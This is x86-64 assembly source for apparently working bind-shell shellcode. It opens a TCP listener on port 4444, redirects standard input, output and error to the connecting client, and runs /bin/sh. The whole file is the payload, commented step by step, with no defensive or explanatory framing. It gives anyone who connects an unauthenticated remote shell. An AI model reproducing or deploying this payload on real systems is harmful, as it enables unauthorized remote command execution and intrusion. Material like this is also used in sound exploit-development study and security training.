section .text
global _start
_start:

	;sock = socket[ AF_INET, SOCK_STREAM, 0 ]



	mov	rax,41
	mov	rdi,2
	mov	rsi,1
	mov	rdx,0
	syscall

	;copy socket descriptor to rdi for future use

	mov	rdi,rax

	;bind [ sock,[struct sockaddr *]&server, sockaddr_len ]

	xor	rax,rax
	push	rax

	mov	dword [rsp-4],eax
	mov	word [rsp-6],0x5c11
	mov	word [rsp-8],0x2
	sub	rsp,8

	;moving the values in registers of bind syscall

	mov	rax,49
	mov	rsi,rsp
	mov	rdx,16
	syscall

	;listen[ sock, MAX_CLIENT ]

	mov	rax,50
	mov	rsi,2
	syscall


	;accept[ sock, [ struct sockaddr *]&client, &sockaddr_len ]


	mov	rax,43
	sub	rsp,16
	mov	rsi,rsp
	mov	byte [rsp-1],16
	sub	rsp,1
	mov	rdx,rsp
	syscall


	;store the client socket description in r9
	mov	r9,rax

	;close syscall

	mov	rax,3
	syscall

	;dup2[ new fd,old fd ]

	mov	rdi,r9
	mov	rax,33
	mov	rsi,0
	syscall

	mov	rax,33
	mov	rsi,1
	syscall

	mov	rax,33
	mov	rsi,2
	syscall

	;execve syscall to execute bin/sh

	xor	rax,rax
	push	rax
	mov	rbx,0x68732f2f6e69622f
	push	rbx
	mov	rdi,rsp
	push	rax
	mov	rdx,rsp
	push	rdi
	mov	rsi,rsp
	add	rax,59
	syscall

